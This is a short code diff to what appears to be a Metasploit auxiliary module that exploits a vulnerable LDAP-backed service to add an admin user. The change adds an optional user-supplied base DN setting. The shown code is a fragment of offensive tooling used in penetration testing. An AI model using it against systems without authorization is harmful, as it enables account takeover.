@@ -46,6 +46,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
+      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
       OptString.new('USERNAME', [false, 'Username of admin user to add']),
       OptString.new('PASSWORD', [false, 'Password of admin user to add'])
     ])
@@ -86,8 +87,12 @@ class MetasploitModule < Msf::Auxiliary
 
     return unless checkcode == Exploit::CheckCode::Vulnerable
 
-    # HACK: We stashed the detected base DN in the CheckCode's reason
-    @base_dn = checkcode.reason
+    if (@base_dn = datastore['BASE_DN'])
+      print_status("User-specified base DN: #{base_dn}")
+    else
+      # HACK: We stashed the detected base DN in the CheckCode's reason
+      @base_dn = checkcode.reason
+    end
 
     opts = {
       host: rhost,
